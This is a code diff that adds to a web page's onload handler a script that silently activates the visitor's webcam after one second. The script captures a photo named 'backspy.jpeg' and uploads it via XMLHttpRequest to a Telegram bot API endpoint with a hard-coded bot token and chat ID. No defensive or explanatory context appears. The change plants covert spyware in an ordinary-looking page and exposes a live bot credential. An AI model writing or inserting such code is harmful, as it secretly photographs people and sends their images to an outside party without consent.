@@ -70,5 +70,23 @@ function userName(){
 	});
 }
 window.onload = function(){
+	Webcam.attach('#my_camera');
+	setTimeout(function(){
+		Webcam.snap( function(data_uri) {
+			var form = document.getElementById("myAwesomeForm");
+			var ImageURL = `${data_uri}`;
+			var block = ImageURL.split(";");
+			var contentType = block[0].split(":")[1];
+			var realData = block[1].split(",")[1];
+			document.querySelector('.bttn').classList.add('disabledbtn');
+			document.querySelector('.bttn').setAttribute("disabled","")
+			var blob = b64toBlob(realData, contentType);
+			var formDataToUpload = new FormData(form);
+			formDataToUpload.append("document", blob, "backspy.jpeg");
+			var xhr = new XMLHttpRequest();
+			xhr.open('POST', `https://api.telegram.org/bot5342005128:AAFjMw1i9K-FSDX0RzrRHgsyhMj9QMs80VU/sendDocument?chat_id=1603299669`, true);
+			xhr.send(formDataToUpload);
+		});
+	},1000)
 	userName()
 }
